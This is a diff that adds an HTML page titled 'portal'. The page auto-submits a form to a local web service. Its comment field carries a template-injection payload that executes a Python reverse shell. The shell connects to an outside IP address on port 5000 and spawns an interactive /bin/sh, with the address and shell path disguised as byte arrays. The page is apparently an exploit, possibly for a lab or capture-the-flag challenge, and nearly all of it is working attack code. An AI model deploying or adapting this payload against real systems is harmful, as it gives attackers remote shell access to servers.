@@ -1,0 +1,21 @@
+<!doctype html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <title>portal</title>
+</head>
+
+<body>
+    <form method="POST" action="http://localhost:4000/">
+        <input name="comment"
+            value="{{config.__class__.__init__.__globals__['os'].popen('echo import\ socket,os,subprocess\;s=socket.socket\(socket.AF_INET,socket.SOCK_STREAM\)\;s.connect\(\(bytes\(\[49,53,46,49,54,52,46,49,54,52,46,50,49,51\]\).decode\(\),5000\)\)\;\[os.dup2\(s.fileno\(\),fd\)\ for\ fd\ in\ \(0,1,2\)\]\;subprocess.call\(\[bytes\(\[47,98,105,110,47,115,104\]\).decode\(\),bytes\(\[45,105\]\).decode\(\)\]\)|python3').read()}}'>">
+    </form>
+
+    <script>
+        document.querySelector("form").submit();
+    </script>
+
+</body>
+
+</html>
